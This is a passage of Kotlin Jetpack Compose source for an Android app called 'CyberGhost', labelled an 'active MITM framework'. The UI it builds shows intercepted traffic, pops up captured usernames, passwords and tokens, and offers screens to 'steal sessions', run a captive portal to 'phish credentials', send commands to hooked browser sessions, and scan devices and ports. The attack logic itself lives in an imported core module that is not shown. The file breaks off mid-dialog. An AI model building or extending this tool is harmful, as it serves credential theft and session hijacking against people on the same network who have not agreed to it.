@file:OptIn(ExperimentalLayoutApi::class, ExperimentalMaterial3Api::class)
package com.cyberghost.ui

import android.graphics.Bitmap
import androidx.compose.animation.*
import androidx.compose.animation.core.*
import androidx.compose.foundation.*
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.lazy.items
import androidx.compose.foundation.lazy.rememberLazyListState
import androidx.compose.foundation.shape.CircleShape
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.*
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.clip
import androidx.compose.ui.draw.shadow
import androidx.compose.ui.graphics.Brush
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.graphics.asImageBitmap
import androidx.compose.foundation.text.selection.SelectionContainer
import androidx.compose.material3.TabRowDefaults.tabIndicatorOffset
import androidx.compose.ui.graphics.vector.ImageVector
import androidx.compose.ui.text.font.FontFamily
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.text.input.PasswordVisualTransformation
import androidx.compose.ui.text.input.TextFieldValue
import androidx.compose.ui.text.input.VisualTransformation
import androidx.compose.ui.text.style.TextAlign
import androidx.compose.ui.text.style.TextOverflow
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.compose.ui.window.Dialog
import androidx.compose.ui.window.DialogProperties
import com.cyberghost.core.*

// ============================
// THEME + COLORS
// ============================
val CgGreen = Color(0xFF00FF41)
val CgDimGreen = Color(0xFF00AA2A)
val CgCyan = Color(0xFF00D4FF)
val CgAmber = Color(0xFFFFB000)
val CgRed = Color(0xFFFF3333)
val CgMagenta = Color(0xFFFF44FF)
val CgBg = Color(0xFF080810)
val CgSurface = Color(0xFF0F0F1A)
val CgCard = Color(0xFF161622)
val CgCardHigh = Color(0xFF1E1E2E)
val CgGray = Color(0xFF6B6B80)
val CgGrayLight = Color(0xFF9999AA)
val CgWhite = Color(0xFFE8E8F0)
val CgBlue = Color(0xFF4488FF)
val CgPurple = Color(0xFF9966FF)
val CgOrange = Color(0xFFFF6600)

@Composable
fun CyberGhostTheme(content: @Composable () -> Unit) {
    MaterialTheme(
        colorScheme = darkColorScheme(
            background = CgBg, surface = CgSurface, surfaceVariant = CgCard,
            primary = CgGreen, secondary = CgCyan, tertiary = CgAmber,
            error = CgRed, onBackground = CgWhite, onSurface = CgWhite,
            onPrimary = CgBg, outline = CgGray, surfaceContainerHigh = CgCard
        ),
        content = content
    )
}

enum class Screen {
    DASHBOARD, INTERCEPT, CREDENTIALS, DEVICES, HOOKED,
    NETWORK, STATS, HIJACK, CAPTIVE, WEBSOCKET, SETTINGS, ABOUT, SETUP, ALERTS
}

// ============================
// ROOT APP
// ============================
@Composable
fun CyberGhostApp(
    interceptQueue: List<PendingIntercept>,
    packets: List<InterceptedPacket>,
    devices: List<ConnectedDevice>,
    hookedSessions: List<HookedSession>,
    mode: InterceptMode,
    isRunning: Boolean,
    events: List<C2Event>,
    networkHosts: List<NetworkHost>,
    isScanning: Boolean,
    trafficStats: TrafficStats,
    profiles: List<String>,
    certInfos: Map<String, CertInfo>,
    credentials: List<HarvestedCredential>,
    currentConfig: InjectionConfig,
    hijackSessions: List<HijackSession>,
    captiveEntries: List<CaptiveEntry>,
    captiveConfig: CaptiveConfig,
    wsFrames: List<WebSocketFrame>,
    savedSessions: List<String>,
    autoStartEnabled: Boolean,
    gatewayIp: String,
    alertConfig: AlertConfig,
    portScanResults: Map<String, PortScanResult>,
    onModeChange: (InterceptMode) -> Unit,
    onToggle: () -> Unit,
    onForward: (String, InterceptedPacket) -> Unit,
    onDrop: (String) -> Unit,
    onCommand: (String, String, Map<String, Any?>) -> Unit,
    onExportCa: () -> Unit,
    onExportHar: () -> Unit,
    onConfigUpdate: (InjectionConfig) -> Unit,
    onScanNetwork: () -> Unit,
    onSaveProfile: (String) -> Unit,
    onLoadProfile: (String) -> Unit,
    onDeleteProfile: (String) -> Unit,
    onSetNickname: (String, String) -> Unit,
    onInspectCert: (String) -> Unit,
    onClearCredentials: () -> Unit,
    onHijackSession: (HijackSession) -> Unit,
    onRemoveHijack: (String) -> Unit,
    onUpdateCaptiveConfig: (CaptiveConfig) -> Unit,
    onSaveSession: () -> Unit,
    onDeleteSession: (String) -> Unit,
    onShareSession: (String) -> Unit,
    onToggleAutoStart: (Boolean) -> Unit,
    onUpdateAlertConfig: (AlertConfig) -> Unit,
    onPortScan: (String) -> Unit
) {
    var currentScreen by remember { mutableStateOf(Screen.DASHBOARD) }
    var searchQuery by remember { mutableStateOf("") }
    var credAlert by remember { mutableStateOf<HarvestedCredential?>(null) }

    // show popup when new cred arrives
    LaunchedEffect(credentials.size) {
        if (credentials.isNotEmpty()) credAlert = credentials.last()
    }

    // credential popup
    credAlert?.let { cred ->
        CredentialPopup(cred) { credAlert = null }
    }

    Scaffold(
        bottomBar = {
            NavigationBar(
                containerColor = CgSurface.copy(alpha = 0.95f),
                tonalElevation = 0.dp,
                modifier = Modifier.shadow(8.dp)
            ) {
                NavItem(Screen.DASHBOARD, currentScreen, Icons.Filled.Dashboard, "Home") { currentScreen = it }
                NavItem(Screen.INTERCEPT, currentScreen, Icons.Filled.SwapVert, "Traffic",
                    badge = if (interceptQueue.isNotEmpty()) "${interceptQueue.size}" else null) { currentScreen = it }
                NavItem(Screen.CREDENTIALS, currentScreen, Icons.Filled.Key, "Creds",
                    badge = if (credentials.isNotEmpty()) "${credentials.size}" else null) { currentScreen = it }
                NavItem(Screen.DEVICES, currentScreen, Icons.Filled.Devices, "Devices",
                    badge = if (devices.isNotEmpty()) "${devices.size}" else null) { currentScreen = it }
                NavItem(Screen.SETTINGS, currentScreen, Icons.Filled.MoreHoriz, "More") { currentScreen = it }
            }
        }
    ) { padding ->
        Box(Modifier.fillMaxSize().background(CgBg).padding(padding)) {
            when (currentScreen) {
                Screen.DASHBOARD -> DashboardScreen(isRunning, onToggle, devices, hookedSessions,
                    trafficStats, packets, credentials, captiveEntries, networkHosts, onExportHar) { currentScreen = it }
                Screen.INTERCEPT -> InterceptScreen(interceptQueue, packets, searchQuery,
                    { searchQuery = it }, onForward, onDrop, onInspectCert)
                Screen.CREDENTIALS -> CredentialsScreen(credentials, onClearCredentials) { currentScreen = Screen.HIJACK }
                Screen.DEVICES -> DevicesScreen(devices, networkHosts, gatewayIp, onSetNickname, onPortScan, portScanResults) { currentScreen = Screen.SETUP }
                Screen.HOOKED -> HookedScreen(hookedSessions, events, onCommand)
                Screen.NETWORK -> NetworkMapScreen(networkHosts, isScanning, onScanNetwork)
                Screen.STATS -> StatsScreen(trafficStats)
                Screen.HIJACK -> HijackScreen(hijackSessions, onHijackSession, onRemoveHijack)
                Screen.CAPTIVE -> CaptiveScreen(captiveConfig, captiveEntries, onUpdateCaptiveConfig)
                Screen.WEBSOCKET -> WebSocketScreen(wsFrames)
                Screen.SETTINGS -> SettingsScreen(mode, onModeChange, currentConfig, onConfigUpdate,
                    profiles, onSaveProfile, onLoadProfile, onDeleteProfile, onExportCa,
                    savedSessions, onSaveSession, onDeleteSession, onShareSession,
                    autoStartEnabled, onToggleAutoStart) { currentScreen = it }
                Screen.ABOUT -> AboutScreen()
                Screen.SETUP -> QrSetupScreen(gatewayIp, isRunning, onExportCa)
                Screen.ALERTS -> AlertsScreen(alertConfig, onUpdateAlertConfig)
            }
        }
    }
}

// ============================
// CREDENTIAL POPUP
// ============================
@Composable
fun CredentialPopup(cred: HarvestedCredential, onDismiss: () -> Unit) {
    LaunchedEffect(Unit) {
        kotlinx.coroutines.delay(5000)
        onDismiss()
    }
    Dialog(onDismissRequest = onDismiss, properties = DialogProperties(usePlatformDefaultWidth = false)) {
        Box(Modifier.fillMaxWidth().padding(24.dp)) {
            Card(
                modifier = Modifier.fillMaxWidth(),
                colors = CardDefaults.cardColors(containerColor = CgCard),
                shape = RoundedCornerShape(16.dp),
                border = BorderStroke(2.dp, CgRed.copy(0.6f)),
                elevation = CardDefaults.cardElevation(8.dp)
            ) {
                Column(Modifier.padding(18.dp)) {
                    Row(verticalAlignment = Alignment.CenterVertically) {
                        Icon(Icons.Filled.Warning, contentDescription = null, tint = CgRed, modifier = Modifier.size(22.dp))
                        Spacer(Modifier.width(8.dp))
                        Text("CREDENTIAL CAPTURED", fontSize = 14.sp, fontWeight = FontWeight.Black,
                            color = CgRed, letterSpacing = 1.sp)
                        Spacer(Modifier.weight(1f))
                        IconButton(onClick = onDismiss, modifier = Modifier.size(24.dp)) {
                            Icon(Icons.Filled.Close, contentDescription = null, tint = CgGray, modifier = Modifier.size(16.dp))
                        }
                    }
                    Spacer(Modifier.height(12.dp))
                    Text(cred.host, fontSize = 16.sp, fontWeight = FontWeight.Bold, color = CgWhite)
                    Spacer(Modifier.height(8.dp))
                    cred.username?.let {
                        Row {
                            Text("User  ", fontSize = 12.sp, color = CgGray)
                            Text(it, fontSize = 12.sp, color = CgCyan, fontFamily = FontFamily.Monospace, fontWeight = FontWeight.Bold)
                        }
                    }
                    cred.password?.let {
                        Row {
                            Text("Pass  ", fontSize = 12.sp, color = CgGray)
                            Text(it, fontSize = 12.sp, color = CgRed, fontFamily = FontFamily.Monospace, fontWeight = FontWeight.Bold)
                        }
                    }
                    cred.token?.let {
                        Row {
                            Text("Token ", fontSize = 12.sp, color = CgGray)
                            Text(it.take(36), fontSize = 12.sp, color = CgAmber, fontFamily = FontFamily.Monospace)
                        }
                    }
                    Spacer(Modifier.height(8.dp))
                    Text("From ${cred.sourceIp} · ${cred.protocol}", fontSize = 10.sp, color = CgGray)
                }
            }
        }
    }
}

@Composable
fun RowScope.NavItem(
    screen: Screen, current: Screen, icon: ImageVector,
    label: String, badge: String? = null, onSelect: (Screen) -> Unit
) {
    NavigationBarItem(
        icon = {
            BadgedBox(badge = {
                badge?.let { Badge(containerColor = CgRed) { Text(it, fontSize = 7.sp) } }
            }) { Icon(icon, contentDescription = label, modifier = Modifier.size(22.dp)) }
        },
        label = { Text(label, fontSize = 10.sp, fontWeight = if (current == screen) FontWeight.Bold else FontWeight.Normal) },
        selected = current == screen,
        onClick = { onSelect(screen) },
        colors = NavigationBarItemDefaults.colors(
            selectedIconColor = CgGreen, selectedTextColor = CgGreen,
            unselectedIconColor = CgGray, unselectedTextColor = CgGray,
            indicatorColor = CgGreen.copy(alpha = 0.12f)
        )
    )
}

// ============================
// DASHBOARD
// ============================
@Composable
fun DashboardScreen(
    isRunning: Boolean, onToggle: () -> Unit,
    devices: List<ConnectedDevice>, hookedSessions: List<HookedSession>,
    stats: TrafficStats, packets: List<InterceptedPacket>,
    credentials: List<HarvestedCredential>, captiveEntries: List<CaptiveEntry>,
    networkHosts: List<NetworkHost>, onExportHar: () -> Unit,
    navigateTo: (Screen) -> Unit
) {
    val pulseAnim = rememberInfiniteTransition(label = "pulse")
    val pulseAlpha by pulseAnim.animateFloat(0.3f, 1f,
        infiniteRepeatable(tween(900), RepeatMode.Reverse), label = "a")
    val pulseScale by pulseAnim.animateFloat(0.95f, 1.05f,
        infiniteRepeatable(tween(900), RepeatMode.Reverse), label = "s")

    LazyColumn(Modifier.fillMaxSize().padding(horizontal = 16.dp), verticalArrangement = Arrangement.spacedBy(12.dp)) {
        item { Spacer(Modifier.height(8.dp)) }

        // hero header
        item {
            Box(Modifier.fillMaxWidth().clip(RoundedCornerShape(20.dp))
                .background(Brush.linearGradient(
                    listOf(Color(0xFF001A0A), Color(0xFF000D1A), Color(0xFF0A0020))
                ))
                .border(1.dp, Brush.linearGradient(listOf(CgGreen.copy(0.4f), CgCyan.copy(0.2f), CgPurple.copy(0.1f))), RoundedCornerShape(20.dp))
                .padding(20.dp)) {
                Row(Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.SpaceBetween, verticalAlignment = Alignment.CenterVertically) {
                    Column {
                        Row(verticalAlignment = Alignment.CenterVertically) {
                            Text("CYBER", fontSize = 24.sp, fontWeight = FontWeight.Black, color = CgGreen, letterSpacing = 2.sp)
                            Text("GHOST", fontSize = 24.sp, fontWeight = FontWeight.Black, color = CgCyan, letterSpacing = 2.sp)
                        }
                        Text("ACTIVE MITM FRAMEWORK", fontSize = 9.sp, color = CgGray, letterSpacing = 3.sp)
                        Spacer(Modifier.height(8.dp))
                        Row(verticalAlignment = Alignment.CenterVertically) {
                            if (isRunning) {
                                Box(Modifier.size(10.dp).clip(CircleShape)
                                    .background(CgGreen.copy(pulseAlpha))
                                    .shadow(4.dp, CircleShape))
                            } else {
                                Box(Modifier.size(10.dp).clip(CircleShape).background(CgRed))
                            }
                            Spacer(Modifier.width(8.dp))
                            Text(if (isRunning) "INTERCEPTING TRAFFIC" else "ENGINES OFFLINE",
                                fontSize = 11.sp, color = if (isRunning) CgGreen else CgRed,
                                fontWeight = FontWeight.Bold, letterSpacing = 0.5.sp)
                        }
                        if (isRunning) {
                            Spacer(Modifier.height(4.dp))
                            Text("${devices.size} devices · ${hookedSessions.count { it.isAlive }} hooked · ${credentials.size} creds",
                                fontSize = 10.sp, color = CgGray)
                        }
                    }
                    Button(onClick = onToggle, modifier = Modifier.size(width = 90.dp, height = 42.dp),
                        colors = ButtonDefaults.buttonColors(
                            containerColor = if (isRunning) CgRed.copy(0.15f) else CgGreen.copy(0.15f)),
                        shape = RoundedCornerShape(12.dp),
                        border = BorderStroke(1.5.dp, if (isRunning) CgRed.copy(0.7f) else CgGreen.copy(0.7f))) {
                        Icon(if (isRunning) Icons.Filled.Stop else Icons.Filled.PlayArrow,
                            contentDescription = null, tint = if (isRunning) CgRed else CgGreen,
                            modifier = Modifier.size(20.dp))
                        Spacer(Modifier.width(4.dp))
                        Text(if (isRunning) "STOP" else "START",
                            color = if (isRunning) CgRed else CgGreen, fontSize = 11.sp, fontWeight = FontWeight.Bold)
                    }
                }
            }
        }

        // live stat grid
        item {
            Row(Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                GlowStatCard("Devices", "${devices.size}", CgCyan, Icons.Filled.Devices, Modifier.weight(1f)) { navigateTo(Screen.DEVICES) }
                GlowStatCard("Hooked", "${hookedSessions.count { it.isAlive }}", CgMagenta, Icons.Filled.BugReport, Modifier.weight(1f)) { navigateTo(Screen.HOOKED) }
                GlowStatCard("Creds", "${credentials.size}", CgRed, Icons.Filled.Key, Modifier.weight(1f)) { navigateTo(Screen.CREDENTIALS) }
            }
        }
        item {
            Row(Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                GlowStatCard("Packets", "${stats.totalPackets.get()}", CgBlue, Icons.Filled.SwapVert, Modifier.weight(1f)) { navigateTo(Screen.INTERCEPT) }
                GlowStatCard("Traffic", formatBytes(stats.totalBytes.get()), CgPurple, Icons.Filled.DataUsage, Modifier.weight(1f)) { navigateTo(Screen.STATS) }
                GlowStatCard("Portal", "${captiveEntries.size}", CgAmber, Icons.Filled.Wifi, Modifier.weight(1f)) { navigateTo(Screen.CAPTIVE) }
            }
        }

        // live bandwidth mini chart
        if (stats.totalPackets.get() > 0) {
            item {
                val bwHistory by stats.bandwidthHistory.collectAsState()
                CgSection("Live Traffic") {
                    Row(Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.SpaceBetween) {
                        Text("${stats.protocol.httpCount} HTTP", fontSize = 11.sp, color = CgAmber)
                        Text("${stats.protocol.httpsCount} HTTPS", fontSize = 11.sp, color = CgCyan)
                        Text("${stats.protocol.dnsCount} DNS", fontSize = 11.sp, color = CgMagenta)
                    }
                    Spacer(Modifier.height(8.dp))
                    if (bwHistory.isNotEmpty()) {
                        val maxBw = bwHistory.maxOfOrNull { it.bytesPerSecond } ?: 1L
                        Row(Modifier.fillMaxWidth().height(32.dp), horizontalArrangement = Arrangement.spacedBy(1.dp), verticalAlignment = Alignment.Bottom) {
                            bwHistory.takeLast(40).forEach { pt ->
                                val h = if (maxBw > 0) (pt.bytesPerSecond.toFloat() / maxBw * 32).coerceIn(1f, 32f) else 1f
                                Box(Modifier.weight(1f).height(h.dp).clip(RoundedCornerShape(topStart = 1.dp, topEnd = 1.dp))
                                    .background(Brush.verticalGradient(listOf(CgCyan, CgCyan.copy(0.4f)))))
                            }
                        }
                    }
                }
            }
        }

        // quick actions grid
        item { CgSectionLabel("Quick Actions") }
        item {
            Column(verticalArrangement = Arrangement.spacedBy(8.dp)) {
                Row(Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                    ActionCard("QR Setup", "Configure target proxy", Icons.Filled.QrCode, CgGreen, Modifier.weight(1f)) { navigateTo(Screen.SETUP) }
                    ActionCard("Network\nScan", "Discover devices", Icons.Filled.Search, CgCyan, Modifier.weight(1f)) { navigateTo(Screen.NETWORK) }
                }
                Row(Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                    ActionCard("Hijack", "Steal sessions", Icons.Filled.Lock, CgRed, Modifier.weight(1f)) { navigateTo(Screen.HIJACK) }
                    ActionCard("Portal", "Phish credentials", Icons.Filled.Wifi, CgAmber, Modifier.weight(1f)) { navigateTo(Screen.CAPTIVE) }
                }
                Row(Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                    ActionCard("WS Frames", "WebSocket capture", Icons.Filled.Power, CgPurple, Modifier.weight(1f)) { navigateTo(Screen.WEBSOCKET) }
                    ActionCard("Alerts", "Telegram & webhooks", Icons.Filled.Notifications, CgBlue, Modifier.weight(1f)) { navigateTo(Screen.ALERTS) }
                }
                Row(Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                    ActionCard("Stats", "Traffic analytics", Icons.Filled.BarChart, CgOrange, Modifier.weight(1f)) { navigateTo(Screen.STATS) }
                    ActionCard("Export\nHAR", "Save capture", Icons.Filled.FileDownload, CgDimGreen, Modifier.weight(1f), onExportHar)
                }
            }
        }

        // latest credential alert
        if (credentials.isNotEmpty()) {
            item { CgSectionLabel("Latest Credential") }
            item {
                val cred = credentials.last()
                Card(Modifier.fillMaxWidth().clickable { navigateTo(Screen.CREDENTIALS) },
                    colors = CardDefaults.cardColors(containerColor = CgRed.copy(0.06f)),
                    shape = RoundedCornerShape(14.dp),
                    border = BorderStroke(1.dp, CgRed.copy(0.4f))) {
                    Row(Modifier.padding(14.dp), verticalAlignment = Alignment.CenterVertically) {
                        Box(Modifier.size(40.dp).clip(RoundedCornerShape(10.dp)).background(CgRed.copy(0.15f)),
                            contentAlignment = Alignment.Center) {
                            Icon(Icons.Filled.Key, contentDescription = null, tint = CgRed, modifier = Modifier.size(20.dp))
                        }
                        Spacer(Modifier.width(12.dp))
                        Column(Modifier.weight(1f)) {
                            Text(cred.host, fontSize = 14.sp, fontWeight = FontWeight.Bold, color = CgWhite)
                            cred.username?.let { Text("User: $it", fontSize = 11.sp, color = CgCyan) }
                            cred.password?.let { Text("Pass: $it", fontSize = 11.sp, color = CgRed) }
                        }
                        Icon(Icons.Filled.ChevronRight, contentDescription = null, tint = CgGray, modifier = Modifier.size(16.dp))
                    }
                }
            }
        }

        // recent packets
        if (packets.isNotEmpty()) {
            item { CgSectionLabel("Live Traffic") }
            items(packets.takeLast(6).reversed()) { pkt -> MiniPacketRow(pkt) }
        }

        item { Spacer(Modifier.height(8.dp)) }
    }
}

@Composable
fun GlowStatCard(label: String, value: String, color: Color, icon: ImageVector, modifier: Modifier, onClick: () -> Unit) {
    Card(modifier = modifier.clickable(onClick = onClick),
        colors = CardDefaults.cardColors(containerColor = CgCard),
        shape = RoundedCornerShape(14.dp),
        border = BorderStroke(1.dp, color.copy(0.2f))) {
        Column(Modifier.padding(12.dp), horizontalAlignment = Alignment.CenterHorizontally) {
            Box(Modifier.size(32.dp).clip(RoundedCornerShape(8.dp)).background(color.copy(0.15f)),
                contentAlignment = Alignment.Center) {
                Icon(icon, contentDescription = null, tint = color, modifier = Modifier.size(16.dp))
            }
            Spacer(Modifier.height(6.dp))
            Text(value, fontSize = 18.sp, fontWeight = FontWeight.Black, color = color)
            Text(label, fontSize = 9.sp, color = CgGray, textAlign = TextAlign.Center)
        }
    }
}

@Composable
fun ActionCard(title: String, subtitle: String, icon: ImageVector, color: Color, modifier: Modifier, onClick: () -> Unit) {
    Card(modifier = modifier.clickable(onClick = onClick),
        colors = CardDefaults.cardColors(containerColor = CgCard),
        shape = RoundedCornerShape(14.dp),
        border = BorderStroke(1.dp, color.copy(0.15f))) {
        Row(Modifier.padding(12.dp), verticalAlignment = Alignment.CenterVertically) {
            Box(Modifier.size(38.dp).clip(RoundedCornerShape(10.dp)).background(color.copy(0.12f)),
                contentAlignment = Alignment.Center) {
                Icon(icon, contentDescription = null, tint = color, modifier = Modifier.size(18.dp))
            }
            Spacer(Modifier.width(10.dp))
            Column {
                Text(title, fontSize = 12.sp, fontWeight = FontWeight.Bold, color = CgWhite, lineHeight = 14.sp)
                Text(subtitle, fontSize = 9.sp, color = CgGray, lineHeight = 12.sp)
            }
        }
    }
}

@Composable
fun MiniPacketRow(pkt: InterceptedPacket) {
    val color = when { pkt.protocol == "HTTPS" -> CgCyan; pkt.isRequest -> CgAmber; else -> CgDimGreen }
    Row(Modifier.fillMaxWidth().padding(vertical = 3.dp), verticalAlignment = Alignment.CenterVertically) {
        Box(Modifier.size(6.dp).clip(CircleShape).background(color))
        Spacer(Modifier.width(8.dp))
        Text(pkt.method ?: "—", fontSize = 10.sp, color = color, fontWeight = FontWeight.Bold, modifier = Modifier.width(36.dp))
        Text(pkt.host, fontSize = 10.sp, color = CgWhite.copy(0.8f), modifier = Modifier.weight(1f), maxLines = 1, overflow = TextOverflow.Ellipsis)
        pkt.statusCode?.let { Text("$it", fontSize = 10.sp, color = if (it < 400) CgDimGreen else CgRed) }
    }
}

@Composable
fun CgSection(title: String, content: @Composable ColumnScope.() -> Unit) {
    Card(colors = CardDefaults.cardColors(containerColor = CgCard), shape = RoundedCornerShape(14.dp), modifier = Modifier.fillMaxWidth()) {
        Column(Modifier.padding(14.dp)) {
            Text(title, fontSize = 12.sp, fontWeight = FontWeight.Bold, color = CgGray, letterSpacing = 1.sp)
            Spacer(Modifier.height(8.dp))
            content()
        }
    }
}

@Composable
fun CgSectionLabel(text: String) {
    Text(text.uppercase(), fontSize = 10.sp, fontWeight = FontWeight.Bold, color = CgGray,
        letterSpacing = 1.5.sp, modifier = Modifier.padding(vertical = 2.dp, horizontal = 2.dp))
}

// ============================
// INTERCEPT SCREEN — clickable packets with full inspector
// ============================
@Composable
fun InterceptScreen(
    queue: List<PendingIntercept>, history: List<InterceptedPacket>,
    searchQuery: String, onSearchChange: (String) -> Unit,
    onForward: (String, InterceptedPacket) -> Unit, onDrop: (String) -> Unit,
    onInspectCert: (String) -> Unit
) {
    var inspectPacket by remember { mutableStateOf<InterceptedPacket?>(null) }

    // full screen inspector dialog
    inspectPacket?.let { pkt ->
        PacketInspectorDialog(pkt) { inspectPacket = null }
    }

    Column(Modifier.fillMaxSize()) {
        OutlinedTextField(
            value = searchQuery, onValueChange = onSearchChange,
            placeholder = { Text("Search host, method, path, body...", fontSize = 11.sp, color = CgGray) },
            leadingIcon = { Icon(Icons.Filled.Search, contentDescription = null, tint = CgGray, modifier = Modifier.size(18.dp)) },
            trailingIcon = {
                if (searchQuery.isNotBlank()) {
                    IconButton(onClick = { onSearchChange("") }) {
                        Icon(Icons.Filled.Clear, contentDescription = null, tint = CgGray, modifier = Modifier.size(16.dp))
                    }
                }
            },
            modifier = Modifier.fillMaxWidth().padding(horizontal = 12.dp, vertical = 8.dp).height(48.dp),
            textStyle = androidx.compose.ui.text.TextStyle(fontSize = 12.sp, color = CgWhite),
            singleLine = true, shape = RoundedCornerShape(12.dp),
            colors = OutlinedTextFieldDefaults.colors(unfocusedBorderColor = CgGray.copy(0.25f),
                focusedBorderColor = CgGreen, unfocusedContainerColor = CgCard, focusedContainerColor = CgCard)
        )

        val filtered = if (searchQuery.isBlank()) history else history.filter { pkt ->
            val q = searchQuery.lowercase()
            pkt.host.lowercase().contains(q) || (pkt.method ?: "").lowercase().contains(q) ||
                pkt.path.lowercase().contains(q) || String(pkt.body).lowercase().contains(q)
        }

        LazyColumn(Modifier.fillMaxSize().padding(horizontal = 10.dp)) {
            if (queue.isNotEmpty()) {
                item {
                    Row(verticalAlignment = Alignment.CenterVertically, modifier = Modifier.padding(vertical = 6.dp)) {
                        Box(Modifier.size(8.dp).clip(CircleShape).background(CgAmber))
                        Spacer(Modifier.width(6.dp))
                        Text("PENDING INTERCEPT", fontSize = 10.sp, fontWeight = FontWeight.Bold, color = CgAmber, letterSpacing = 1.sp)
                        Spacer(Modifier.width(6.dp))
                        Badge(containerColor = CgAmber) { Text("${queue.size}", fontSize = 9.sp, color = CgBg) }
                    }
                }
                items(queue) { pending ->
                    InterceptCard(pending.packet, true, { onForward(pending.packet.id, it) }, { onDrop(pending.packet.id) })
                }
                item { Spacer(Modifier.height(8.dp)) }
            }

            item {
                Row(verticalAlignment = Alignment.CenterVertically, modifier = Modifier.padding(vertical = 6.dp)) {
                    Text("TRAFFIC LOG", fontSize = 10.sp, fontWeight = FontWeight.Bold, color = CgGray, letterSpacing = 1.sp)
                    Spacer(Modifier.width(6.dp))
                    Text("${filtered.size}", fontSize = 10.sp, color = CgGray)
                    Spacer(Modifier.weight(1f))
                    Text("tap to inspect", fontSize = 9.sp, color = CgGray.copy(0.5f))
                }
            }
            items(filtered.takeLast(500).reversed()) { pkt ->
                RichPacketRow(pkt) { inspectPacket = pkt }
            }
        }
    }
}

@Composable
fun RichPacketRow(pkt: InterceptedPacket, onClick: () -> Unit) {
    val analysis = remember(pkt.id) { PacketInspector.analyze(pkt) }
    val color = when {
        analysis.sensitiveFields.any { it.risk == RiskLevel.HIGH } -> CgRed
        pkt.protocol == "HTTPS" -> CgCyan
        pkt.isRequest -> CgAmber
        else -> CgDimGreen
    }
    val bgColor = when {
        analysis.sensitiveFields.any { it.risk == RiskLevel.HIGH } -> CgRed.copy(0.06f)
        else -> CgCard
    }

    Card(Modifier.fillMaxWidth().padding(vertical = 2.dp).clickable(onClick = onClick),
        colors = CardDefaults.cardColors(containerColor = bgColor),
        shape = RoundedCornerShape(10.dp),
        border = if (analysis.sensitiveFields.any { it.risk == RiskLevel.HIGH })
            BorderStroke(1.dp, CgRed.copy(0.3f)) else null) {
        Row(Modifier.padding(horizontal = 10.dp, vertical = 8.dp), verticalAlignment = Alignment.CenterVertically) {
            // method badge
            Box(Modifier.width(36.dp).clip(RoundedCornerShape(4.dp)).background(color.copy(0.15f)).padding(horizontal = 4.dp, vertical = 2.dp),
                contentAlignment = Alignment.Center) {
                Text(pkt.method?.take(4) ?: "—", fontSize = 9.sp, color = color, fontWeight = FontWeight.Bold)
            }
            Spacer(Modifier.width(8.dp))

            Column(Modifier.weight(1f)) {
                Row(verticalAlignment = Alignment.CenterVertically) {
                    Text(pkt.protocol, fontSize = 9.sp, color = color, fontWeight = FontWeight.Bold,
                        modifier = Modifier.background(color.copy(0.1f), RoundedCornerShape(3.dp)).padding(horizontal = 4.dp, vertical = 1.dp))
                    Spacer(Modifier.width(6.dp))
                    Text(pkt.host, fontSize = 11.sp, color = CgWhite, fontWeight = FontWeight.Medium,
                        maxLines = 1, overflow = TextOverflow.Ellipsis, modifier = Modifier.weight(1f))
                    pkt.statusCode?.let {
                        Text("$it", fontSize = 10.sp, color = when { it < 300 -> CgDimGreen; it < 400 -> CgAmber; else -> CgRed },
                            fontWeight = FontWeight.Bold)
                    }
                }
                Spacer(Modifier.height(2.dp))
                Row(verticalAlignment = Alignment.CenterVertically) {
                    Text(pkt.path.take(35), fontSize = 10.sp, color = CgGray, modifier = Modifier.weight(1f),
                        maxLines = 1, overflow = TextOverflow.Ellipsis)
                    if (analysis.sensitiveFields.any { it.risk == RiskLevel.HIGH }) {
                        Spacer(Modifier.width(4.dp))
                        Icon(Icons.Filled.Warning, contentDescription = null, tint = CgRed, modifier = Modifier.size(12.dp))
                    }
                }
                // content summary
                Text(analysis.summary, fontSize = 9.sp, color = color.copy(0.7f), maxLines = 1, overflow = TextOverflow.Ellipsis)
            }

            // content type icon
            Spacer(Modifier.width(6.dp))
            Icon(getContentIcon(analysis.contentType), contentDescription = null, tint = color.copy(0.6f), modifier = Modifier.size(14.dp))
        }
    }
}

fun getContentIcon(type: ContentCategory) = when(type) {
    ContentCategory.LOGIN_FORM -> Icons.Filled.Key
    ContentCategory.JSON_API -> Icons.Filled.List
    ContentCategory.IMAGE -> Icons.Filled.Image
    ContentCategory.HTML_PAGE -> Icons.Filled.Code
    ContentCategory.JAVASCRIPT -> Icons.Filled.Code
    ContentCategory.CSS -> Icons.Filled.Brush
    ContentCategory.REDIRECT -> Icons.Filled.CallMissedOutgoing
    ContentCategory.COOKIE_SESSION -> Icons.Filled.Circle
    ContentCategory.AUTH_HEADER -> Icons.Filled.Security
    ContentCategory.BINARY -> Icons.Filled.FileCopy
    else -> Icons.Filled.Description
}

// ============================
// PACKET INSPECTOR DIALOG
// ============================
@Composable
fun PacketInspectorDialog(pkt: InterceptedPacket, onDismiss: () -> Unit) {
    val analysis = remember(pkt.id) { PacketInspector.analyze(pkt) }
    var tab by remember { mutableStateOf(0) }
    val tabs = buildList {
        add("Overview")
        if (analysis.sensitiveFields.isNotEmpty()) add("Sensitive")
        if (analysis.jsonTree != null) add("JSON")
        if (analysis.imageData != null) add("Image")
        if (analysis.formFields.isNotEmpty()) add("Form")
        add("Headers")
        add("Raw")
    }

    Dialog(onDismissRequest = onDismiss, properties = DialogProperties(usePlatformDefaultWidth = false)) {
        Card(Modifier.fillMaxWidth(0.96f).fillMaxHeight(0.92f),
